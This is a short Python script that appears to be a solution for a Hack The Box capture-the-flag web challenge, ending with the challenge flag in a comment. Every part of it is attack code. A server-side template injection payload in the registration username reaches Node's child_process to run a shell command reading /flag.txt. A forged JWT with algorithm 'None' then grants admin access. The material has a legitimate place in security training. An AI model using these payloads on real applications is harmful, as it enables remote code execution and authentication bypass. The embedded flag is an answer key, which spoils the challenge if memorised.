import requests

ip = '206.189.112.129:30519'

json_data = {
    'username': """{{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /flag.txt').toString()")()}}""",
    'password': 'asdf',
}

response = requests.post(f'http://{ip}/register', json=json_data, verify=False)

cookies = {
    # 'session': token,
    # {"alg":"None","typ":"JWT"} {"id":1,"iat":1679467334,"exp":1679470934}
    'session': 'eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJpZCI6MSwiaWF0IjoxNjc5NDY3MzM0LCJleHAiOjE2Nzk0NzA5MzR9.',
}

res = requests.get(f'http://{ip}/admin', cookies=cookies, verify=False)

print (res.text)

# HTB{Pr3_C0MP111N6_W17H0U7_P4DD13804rD1N6_5K1115}